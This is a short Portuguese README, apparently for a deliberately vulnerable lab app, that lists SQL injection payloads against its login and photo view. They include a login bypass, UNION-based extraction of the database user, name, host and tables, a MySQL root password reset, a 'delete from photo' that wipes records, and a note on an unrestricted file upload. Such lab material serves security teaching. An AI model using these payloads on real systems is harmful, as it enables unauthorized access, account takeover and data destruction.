#### **Injection no Login**

`' or 1 = 1;`

#### **Injection na Visualização da Foto**

* **Verificando Núumero de Colunas da Consulta**

`UNION ALL SELECT 1,2`

`UNION ALL SELECT 1,2,3,4 ORDER BY RAND()`

* **Descoberto número de colunas, pegando usuário da conexão com banco**

`UNION ALL SELECT 1,user(),3,4 ORDER BY RAND()`

* **Pegando o nome do banco**

`UNION ALL SELECT 1,database(),3,4 ORDER BY RAND()`

* **pegando o nome do host**

`UNION ALL SELECT 1,SUBSTRING_INDEX(USER(), '@', -1),3,4 ORDER BY RAND()`

* **Caso seja usuário root**

`UPDATE mysql.user SET authentication_string=PASSWORD('123') WHERE user='root';FLUSH PRIVILEGES;`

`mysql -u root -p`

* **Ver as tabelas na busca**

`%' UNION SELECT 1,2,3,table_name FROM information_schema.tables where table_schema='injection' ORDER BY RAND(); #`

* **Removendo registros da tabela photo**

`;delete from photo;`

#### Injection arquivo no servidor, através do upload de foto

O upload de foto está aceitando qualquer tipo de arquivo

#### Branch Secure

`git checkout secure`